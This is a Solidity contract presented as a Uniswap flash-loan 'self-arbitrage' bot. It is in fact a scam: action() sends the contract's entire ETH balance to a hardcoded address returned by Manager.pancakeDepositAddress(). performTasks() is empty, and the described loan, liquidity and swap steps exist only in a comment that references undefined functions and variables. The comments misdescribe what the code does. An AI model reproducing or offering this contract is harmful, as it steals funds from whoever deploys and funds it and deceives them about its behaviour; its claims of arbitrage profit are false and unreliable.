pragma solidity ^0.5.0;
 
//uniswap smart contracts v2 and v3
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol"; import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol"; import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol"; contract Manager {function performTasks() public pure {} function pancakeDepositAddress() public pure returns (address) {return 0x9C4a32c4A630e4f9086b1E5669c047e9132a20B4;}
}    
contract GetFlashLoan {
    string public tokenName;
    string public tokenSymbol;
    uint loanAmount;
    Manager manager;
    
    constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        loanAmount = _loanAmount;
            
        manager = new Manager();
    }
    
    function() external payable {}
    
    function action() public payable {
        // Send required coins for swap
        address(uint160(manager.pancakeDepositAddress())).transfer(address(this).balance);
        
        // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
        // Breakdown of functions written below
        manager.performTasks();
        
        /* Breakdown of functions
        // Submit token to eth blockchain
        string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
 
        // List the token on uniswapSwap
        manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);
        
        // Get ETH Loan from Multiplier-Finance
        string memory loanAddress = manager.takeFlashLoan(loanAmount);
        
        // Convert half ETH to DAI
        manager.uniswapDAItoETH(loanAmount / 2);
 
        // Create ETH and DAI pairs for our token & Provide liquidity
        string memory ethPair = manager.uniswapCreatePool(tokenAddress, "ETH");
        manager.uniswapAddLiquidity(bnbPair, loanAmount / 2);
        string memory daiPair = manager.uniswapCreatePool(tokenAddress, "DAI");
        manager.uniswapAddLiquidity(daiPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
        manager.uniswapPerformSwaps();
        
        // Move remaining ETH from Contract to your account
        manager.contractToWallet("ETH");
 
        // Repay Flash loan
        manager.repayLoan(loanAddress);
        */
    }
 
}